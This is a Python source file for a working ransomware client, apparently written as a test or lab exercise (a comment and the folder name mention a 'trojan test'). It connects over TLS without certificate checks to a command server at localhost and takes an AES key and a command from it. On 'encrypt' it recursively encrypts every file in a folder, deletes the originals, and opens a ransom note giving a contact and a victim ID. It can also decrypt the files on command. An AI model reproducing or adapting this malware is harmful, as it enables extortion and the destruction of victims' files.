import socket
import ssl
import os
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
from Crypto.Util.Padding import pad, unpad
import sys

HOST = "127.0.0.1"
PORT = 44444

context = ssl._create_unverified_context()

folder = "D:\\טרויאני בדיקה"

def show_ransom_note_encryption():
    note = """
    🔒 All your files have been encrypted!
    
    To get the key and decrypt your files, you must contact us.

    Contact: hackers@example.com
    Your victim ID: 142739ddd
    """
    
    with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
        f.write(note)
    
    # Optionally open the file or display message
    os.system("notepad README_DECRYPT.txt")

def show_ransom_note_decryption():
    
    note = """
    🔓 All your files have been decrypted!

    Your system is no longer encrypted and your files are back to normal."""
    
    with open("README_DECRYPT.txt", "w", encoding="utf-8") as f:
        f.write(note)
    
    os.system("notepad README_DECRYPT.txt")
    
    
def Encryption_all_files_in_folder(folder_path, AES_KEY):
    for file_name in os.listdir(folder_path):
        full_path = os.path.join(folder_path, file_name)
        
        if os.path.isfile(full_path):
            try:
                with open(full_path,"rb") as f:
                    file_data = f.read()

                iv = get_random_bytes(16)
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
                encrypted_data = cipher.encrypt(pad(file_data, AES.block_size))
                encrypted_path = full_path + "_"

                with open(encrypted_path, "wb") as f:
                    f.write(iv + encrypted_data)

                os.remove(full_path)

            except Exception as e:
                continue

        elif os.path.isdir(full_path):
            Encryption_all_files_in_folder(full_path, AES_KEY)
            
def Decryption_all_files_in_folder(folder_path, AES_KEY):
    for file_name in os.listdir(folder_path):
        full_path = os.path.join(folder_path, file_name)

        if os.path.isfile(full_path):
            try:
                with open(full_path, "rb") as f:
                    file_data = f.read()

                iv = file_data[:16]
                encrypted_data = file_data[16:]

                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
                decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)

                decrypted_path = full_path.rstrip("_")

                with open(decrypted_path, "wb") as f:
                    f.write(decrypted_data)

                os.remove(full_path)

            except Exception as e:
                continue

        elif os.path.isdir(full_path):
            Decryption_all_files_in_folder(full_path, AES_KEY)
    
    
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    with context.wrap_socket(s, server_hostname="anything") as secure_sock:
        secure_sock.connect((HOST,PORT))
        
        while True:
            aes_key = b""
            while True: # נקבל את המילה הסודית מהשרת
                aes_key = aes_key + secure_sock.recv(1024)
                
                if aes_key.endswith(b"__END__"):
                    aes_key = aes_key.removesuffix(b"__END__")
                    break
                        
                        
            action = ""
            while True:
                action = action + secure_sock.recv(1024).decode()
                
                if action.endswith("__END__"):
                    action = action.removesuffix("__END__")
                    break
            
            if action == "encrypt":
                
                Encryption_all_files_in_folder(folder, aes_key)
                
                del aes_key
                show_ransom_note_encryption()
                
                secure_sock.sendall(b"the files are encrypted")
                secure_sock.sendall(b"__END__")
            
            elif action == "decrypt":
                
                Decryption_all_files_in_folder(folder, aes_key)
                del aes_key
                show_ransom_note_decryption()
                
                secure_sock.sendall(b"the files are decrypted")
                secure_sock.sendall(b"__END__")
            
            
            sys.exit()